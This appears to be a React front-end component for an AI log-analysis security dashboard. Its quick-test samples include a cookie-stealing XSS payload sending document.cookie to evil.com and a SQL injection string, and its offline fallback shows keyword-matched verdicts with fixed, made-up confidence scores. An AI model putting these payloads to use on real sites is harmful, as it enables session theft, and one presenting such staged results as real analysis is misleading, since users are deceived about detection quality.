import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import axios from 'axios';


const NeuralNetwork = ({ active }) => {
  const nodes = [
    { id: 1, x: 80, y: 60, layer: 0 },
    { id: 2, x: 80, y: 130, layer: 0 },
    { id: 3, x: 80, y: 200, layer: 0 },
    { id: 4, x: 200, y: 40, layer: 1 },
    { id: 5, x: 200, y: 100, layer: 1 },
    { id: 6, x: 200, y: 160, layer: 1 },
    { id: 7, x: 200, y: 220, layer: 1 },
    { id: 8, x: 320, y: 80, layer: 2 },
    { id: 9, x: 320, y: 150, layer: 2 },
    { id: 10, x: 320, y: 220, layer: 2 },
    { id: 11, x: 420, y: 130, layer: 3 },
  ];

  const connections = [];
  nodes.filter(n => n.layer === 0).forEach(a => {
    nodes.filter(n => n.layer === 1).forEach(b => connections.push({ x1: a.x, y1: a.y, x2: b.x, y2: b.y }));
  });
  nodes.filter(n => n.layer === 1).forEach(a => {
    nodes.filter(n => n.layer === 2).forEach(b => connections.push({ x1: a.x, y1: a.y, x2: b.x, y2: b.y }));
  });
  nodes.filter(n => n.layer === 2).forEach(a => {
    nodes.filter(n => n.layer === 3).forEach(b => connections.push({ x1: a.x, y1: a.y, x2: b.x, y2: b.y }));
  });

  return (
    <svg width="500" height="280" style={{ overflow: 'visible' }}>
      {connections.map((c, i) => (
        <motion.line
          key={i}
          x1={c.x1} y1={c.y1} x2={c.x2} y2={c.y2}
          stroke={active ? '#00d4ff' : 'rgba(0,212,255,0.1)'}
          strokeWidth="0.8"
          animate={active ? { opacity: [0.1, 0.8, 0.1] } : { opacity: 0.1 }}
          transition={{ duration: 1.5, repeat: Infinity, delay: i * 0.02 }}
        />
      ))}
      {nodes.map(n => (
        <motion.circle
          key={n.id}
          cx={n.x} cy={n.y} r={n.layer === 3 ? 14 : 10}
          fill="rgba(0,212,255,0.1)"
          stroke={n.layer === 3 ? '#00ff88' : '#00d4ff'}
          strokeWidth="1.5"
          animate={active ? {
            fill: ['rgba(0,212,255,0.1)', 'rgba(0,212,255,0.4)', 'rgba(0,212,255,0.1)'],
            boxShadow: ['0 0 5px #00d4ff', '0 0 20px #00d4ff', '0 0 5px #00d4ff']
          } : {}}
          transition={{ duration: 1.2, repeat: Infinity, delay: n.id * 0.1 }}
          style={{ filter: active ? 'drop-shadow(0 0 6px #00d4ff)' : 'none' }}
        />
      ))}
    </svg>
  );
};


const ConfidenceGauge = ({ value }) => {
  const size = 160;
  const r = 60;
  const circ = Math.PI * r;
  const progress = (value / 100) * circ;
  const color = value > 90 ? '#ff0040' : value > 70 ? '#ff6600' : '#00ff88';

  return (
    <div style={{ textAlign: 'center' }}>
      <svg width={size} height={size / 2 + 30} viewBox={`0 0 ${size} ${size / 2 + 20}`}>
        <path
          d={`M 20 ${size/2} A ${r} ${r} 0 0 1 ${size-20} ${size/2}`}
          fill="none" stroke="rgba(255,255,255,0.05)"
          strokeWidth="10" strokeLinecap="round"
        />
        <motion.path
          d={`M 20 ${size/2} A ${r} ${r} 0 0 1 ${size-20} ${size/2}`}
          fill="none" stroke={color}
          strokeWidth="10" strokeLinecap="round"
          strokeDasharray={circ}
          initial={{ strokeDashoffset: circ }}
          animate={{ strokeDashoffset: circ - progress }}
          transition={{ duration: 1.5, ease: 'easeOut' }}
          style={{ filter: `drop-shadow(0 0 8px ${color})` }}
        />
        <text x={size/2} y={size/2 + 10}
          textAnchor="middle" fill={color}
          fontFamily="Orbitron,monospace"
          fontSize="22" fontWeight="900">
          {value}%
        </text>
        <text x={size/2} y={size/2 + 28}
          textAnchor="middle" fill="#3a6a8a"
          fontFamily="monospace" fontSize="9">
          CONFIDENCE
        </text>
      </svg>
    </div>
  );
};

const Terminal = ({ lines }) => {
  const bottomRef = useRef(null);
  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [lines]);

  return (
    <div style={{
      background: '#010608',
      border: '1px solid rgba(0,255,136,0.2)',
      borderRadius: '4px',
      padding: '16px',
      height: '200px',
      overflowY: 'auto',
      fontFamily: 'monospace',
      fontSize: '12px'
    }}>
      {lines.map((line, i) => (
        <div key={i} style={{ marginBottom: '4px', color: line.color || '#00ff88' }}>
          <span style={{ color: '#3a6a8a' }}>{'>'} </span>
          {line.text}
        </div>
      ))}
      <div ref={bottomRef} />
    </div>
  );
};

const AIAnalysis = () => {
  const [logInput, setLogInput] = useState('');
  const [analyzing, setAnalyzing] = useState(false);
  const [result, setResult] = useState(null);
  const [termLines, setTermLines] = useState([
    { text: 'NEUROSHIELD AI ENGINE v2.0 INITIALIZED', color: '#00d4ff' },
    { text: 'ML MODELS LOADED: Random Forest (99.99%) + Isolation Forest', color: '#00ff88' },
    { text: 'THREAT INTELLIGENCE DB: 50,000+ CVEs indexed', color: '#00ff88' },
    { text: 'READY FOR ANALYSIS...', color: '#ffcc00' },
  ]);

  const addLine = (text, color = '#00ff88') => {
    setTermLines(prev => [...prev, { text, color }]);
  };

  const sampleLogs = [
    'Failed password for root from 192.168.1.105 port 22 ssh2',
    'SELECT * FROM users UNION SELECT * FROM admin--',
    '<script>document.location="http://evil.com?c="+document.cookie</script>',
    'SYN_SENT 192.168.1.1:80 from 10.0.0.55 - nmap scan detected',
  ];

  const analyze = async () => {
    if (!logInput.trim()) return;
    setAnalyzing(true);
    setResult(null);

    addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━', '#3a6a8a');
    addLine(`INPUT RECEIVED: "${logInput.slice(0, 50)}..."`, '#00d4ff');
    addLine('PREPROCESSING LOG DATA...', '#ffcc00');

    await new Promise(r => setTimeout(r, 600));
    addLine('RUNNING ISOLATION FOREST MODEL...', '#ffcc00');

    await new Promise(r => setTimeout(r, 600));
    addLine('RUNNING RANDOM FOREST CLASSIFIER...', '#ffcc00');

    await new Promise(r => setTimeout(r, 600));
    addLine('ANALYZING ATTACK PATTERNS...', '#ffcc00');

    try {
      const res = await axios.post('http://localhost:8000/api/v1/analyze-log', {
        raw_log: logInput
      });

      await new Promise(r => setTimeout(r, 400));

      const data = res.data;
      if (data.threat_detected) {
        addLine(`⚠ THREAT DETECTED: ${data.attack_type}`, '#ff0040');
        addLine(`SEVERITY: ${data.severity?.toUpperCase()}`, '#ff6600');
        addLine(`CONFIDENCE: ${data.confidence_score ? Math.round(data.confidence_score * 100) : 85}%`, '#ff0040');
        setResult({
          is_threat: true,
          attack_type: data.attack_type,
          severity: data.severity,
          confidence: data.confidence_score ? Math.round(data.confidence_score * 100) : 85,
          recommendation: '🛡️ Block source IP immediately. Enable detection rules.',
          source_ip: data.source_ip || 'unknown'
        });
      } else {
        addLine('✅ NO THREAT DETECTED — CLEAN LOG', '#00ff88');
        setResult({
          is_threat: false,
          attack_type: 'Normal Traffic',
          severity: 'none',
          confidence: 95,
          recommendation: '✅ Log is clean. No action required.'
        });
      }
    } catch {
      // Demo result
      const isThreat = logInput.toLowerCase().includes('failed') ||
        logInput.toLowerCase().includes('select') ||
        logInput.toLowerCase().includes('script') ||
        logInput.toLowerCase().includes('scan');

      await new Promise(r => setTimeout(r, 400));

      if (isThreat) {
        const attackType = logInput.toLowerCase().includes('select') ? 'SQL Injection' :
          logInput.toLowerCase().includes('script') ? 'XSS Attack' :
          logInput.toLowerCase().includes('failed') ? 'Brute Force' : 'Port Scanning';

        addLine(`⚠ THREAT DETECTED: ${attackType}`, '#ff0040');
        addLine('SEVERITY: CRITICAL', '#ff0040');
        addLine('CONFIDENCE: 96%', '#ff6600');
        setResult({
          is_threat: true,
          attack_type: attackType,
          severity: 'critical',
          confidence: 96,
          recommendation: '🛡️ Block source IP immediately. Enable detection rules.',
        });
      } else {
        addLine('✅ NO THREAT DETECTED', '#00ff88');
        setResult({ is_threat: false, attack_type: 'Normal Traffic', severity: 'none', confidence: 92, recommendation: '✅ Clean log.' });
      }
    }

    addLine('ANALYSIS COMPLETE', '#00d4ff');
    setAnalyzing(false);
  };

  const severityColors = { critical: '#ff0040', high: '#ff6600', medium: '#ffcc00', low: '#00ff88', none: '#00ff88' };

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      style={{ padding: '22px' }}
    >
      {/* Header */}
      <div style={{ marginBottom: '22px' }}>
        <div style={{ fontFamily: 'Orbitron,monospace', fontSize: '20px', fontWeight: '900', color: '#e0f4ff' }}>
          AI ANALYSIS ENGINE
        </div>
        <div style={{ fontFamily: 'monospace', fontSize: '11px', color: '#3a6a8a', marginTop: '3px' }}>
          NEURAL NETWORK THREAT CLASSIFICATION SYSTEM
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>

        {/* LEFT — Input + Terminal */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>

          {/* Log Input */}
          <div style={{
            background: 'rgba(6,13,20,0.9)',
            border: '1px solid rgba(0,212,255,0.15)',
            borderRadius: '4px', padding: '20px'
          }}>
            <div style={{
              fontFamily: 'Orbitron,monospace', fontSize: '10px',
              color: '#3a6a8a', letterSpacing: '2px', marginBottom: '12px'
            }}>📋 PASTE LOG FOR ANALYSIS</div>

            <textarea
              value={logInput}
              onChange={e => setLogInput(e.target.value)}
              placeholder="Paste network log, system log, or suspicious activity here..."
              rows={5}
              style={{
                width: '100%',
                background: '#010608',
                border: '1px solid rgba(0,255,136,0.2)',
                borderRadius: '2px', color: '#00ff88',
                fontFamily: 'monospace', fontSize: '12px',
                padding: '12px', outline: 'none',
                resize: 'none', boxSizing: 'border-box',
                lineHeight: '1.6'
              }}
            />

            {/* Sample Logs */}
            <div style={{ marginTop: '10px', marginBottom: '14px' }}>
              <div style={{
                fontFamily: 'Orbitron,monospace', fontSize: '8px',
                color: '#3a6a8a', letterSpacing: '1px', marginBottom: '8px'
              }}>QUICK TEST:</div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
                {sampleLogs.map((log, i) => (
                  <motion.button
                    key={i}
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={() => setLogInput(log)}
                    style={{
                      padding: '4px 10px',
                      background: 'rgba(0,212,255,0.05)',
                      border: '1px solid rgba(0,212,255,0.2)',
                      borderRadius: '2px', color: '#3a6a8a',
                      fontFamily: 'monospace', fontSize: '10px',
                      cursor: 'pointer'
                    }}
                  >
                    {['Brute Force', 'SQL Inject', 'XSS', 'Port Scan'][i]}
                  </motion.button>
                ))}
              </div>
            </div>

            <motion.button
              whileHover={{ scale: 1.02, boxShadow: '0 0 25px rgba(0,212,255,0.3)' }}
              whileTap={{ scale: 0.98 }}
              onClick={analyze}
              disabled={analyzing || !logInput.trim()}
              style={{
                width: '100%', padding: '13px',
                background: analyzing ? 'rgba(0,212,255,0.05)' : 'rgba(0,212,255,0.1)',
                border: '1px solid #00d4ff',
                borderRadius: '2px', color: '#00d4ff',
                fontFamily: 'Orbitron,monospace',
                fontSize: '11px', letterSpacing: '2px',
                cursor: analyzing ? 'not-allowed' : 'pointer'
              }}
            >
              {analyzing ? (
                <motion.span animate={{ opacity: [1, 0.3, 1] }} transition={{ duration: 0.8, repeat: Infinity }}>
                  🧠 AI ANALYZING...
                </motion.span>
              ) : '⚡ ANALYZE THREAT'}
            </motion.button>
          </div>

          {/* Terminal */}
          <div style={{
            background: 'rgba(6,13,20,0.9)',
            border: '1px solid rgba(0,212,255,0.15)',
            borderRadius: '4px', padding: '16px'
          }}>
            <div style={{
              fontFamily: 'Orbitron,monospace', fontSize: '10px',
              color: '#3a6a8a', letterSpacing: '2px', marginBottom: '12px',
              display: 'flex', alignItems: 'center', gap: '8px'
            }}>
              💻 SYSTEM TERMINAL
              {analyzing && (
                <motion.div
                  animate={{ opacity: [1, 0, 1] }}
                  transition={{ duration: 0.5, repeat: Infinity }}
                  style={{ width: '8px', height: '8px', background: '#00ff88', borderRadius: '50%' }}
                />
              )}
            </div>
            <Terminal lines={termLines} />
          </div>
        </div>

        {/* RIGHT — Neural Net + Results */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>

          {/* Neural Network Viz */}
          <div style={{
            background: 'rgba(6,13,20,0.9)',
            border: '1px solid rgba(0,212,255,0.15)',
            borderRadius: '4px', padding: '20px'
          }}>
            <div style={{
              fontFamily: 'Orbitron,monospace', fontSize: '10px',
              color: '#3a6a8a', letterSpacing: '2px', marginBottom: '12px'
            }}>🧠 NEURAL NETWORK VISUALIZATION</div>
            <div style={{ display: 'flex', justifyContent: 'center' }}>
              <NeuralNetwork active={analyzing} />
            </div>
            <div style={{
              display: 'flex', justifyContent: 'space-around',
              fontFamily: 'monospace', fontSize: '9px', color: '#3a6a8a', marginTop: '8px'
            }}>
              {['INPUT', 'HIDDEN 1', 'HIDDEN 2', 'OUTPUT'].map(l => (
                <span key={l}>{l}</span>
              ))}
            </div>
          </div>

          {/* Results */}
          <AnimatePresence>
            {result && (
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }}
                style={{
                  background: 'rgba(6,13,20,0.9)',
                  border: `1px solid ${result.is_threat ? '#ff004040' : '#00ff8840'}`,
                  borderRadius: '4px', padding: '20px',
                  boxShadow: result.is_threat ? '0 0 30px rgba(255,0,64,0.1)' : '0 0 30px rgba(0,255,136,0.1)'
                }}
              >
                {/* Top border */}
                <div style={{
                  position: 'relative',
                  marginBottom: '16px',
                  paddingBottom: '16px',
                  borderBottom: '1px solid rgba(255,255,255,0.05)'
                }}>
                  <div style={{
                    fontFamily: 'Orbitron,monospace', fontSize: '10px',
                    color: '#3a6a8a', letterSpacing: '2px', marginBottom: '12px'
                  }}>📊 ANALYSIS RESULT</div>

                  {/* Status */}
                  <motion.div
                    animate={result.is_threat ? { opacity: [1, 0.5, 1] } : {}}
                    transition={{ duration: 1.5, repeat: Infinity }}
                    style={{
                      display: 'inline-block',
                      padding: '6px 16px',
                      background: result.is_threat ? 'rgba(255,0,64,0.1)' : 'rgba(0,255,136,0.1)',
                      border: `1px solid ${result.is_threat ? '#ff0040' : '#00ff88'}`,
                      borderRadius: '2px',
                      fontFamily: 'Orbitron,monospace', fontSize: '14px',
                      color: result.is_threat ? '#ff0040' : '#00ff88',
                      textShadow: result.is_threat ? '0 0 10px #ff0040' : '0 0 10px #00ff88',
                      letterSpacing: '2px'
                    }}
                  >
                    {result.is_threat ? '⚠ THREAT DETECTED' : '✅ CLEAN LOG'}
                  </motion.div>
                </div>

                {/* Details */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginBottom: '16px' }}>
                  {[
                    { label: 'ATTACK TYPE', value: result.attack_type, color: severityColors[result.severity] },
                    { label: 'SEVERITY', value: result.severity?.toUpperCase(), color: severityColors[result.severity] },
                  ].map(item => (
                    <div key={item.label} style={{
                      background: 'rgba(0,0,0,0.2)',
                      border: '1px solid rgba(0,212,255,0.1)',
                      borderRadius: '2px', padding: '10px'
                    }}>
                      <div style={{ fontFamily: 'Orbitron,monospace', fontSize: '8px', color: '#3a6a8a', marginBottom: '4px' }}>
                        {item.label}
                      </div>
                      <div style={{ fontFamily: 'monospace', fontSize: '13px', color: item.color || '#c0dff0' }}>
                        {item.value}
                      </div>
                    </div>
                  ))}
                </div>

                {/* Confidence Gauge */}
                <div style={{ display: 'flex', justifyContent: 'center', margin: '10px 0' }}>
                  <ConfidenceGauge value={result.confidence} />
                </div>

                {/* Recommendation */}
                <div style={{
                  background: 'rgba(0,212,255,0.04)',
                  border: '1px solid rgba(0,212,255,0.1)',
                  borderRadius: '2px', padding: '12px',
                  fontFamily: 'monospace', fontSize: '12px',
                  color: '#c0dff0', lineHeight: '1.6'
                }}>
                  <div style={{ fontFamily: 'Orbitron,monospace', fontSize: '8px', color: '#3a6a8a', marginBottom: '6px' }}>
                    RECOMMENDATION
                  </div>
                  {result.recommendation}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </motion.div>
  );
};

export default AIAnalysis;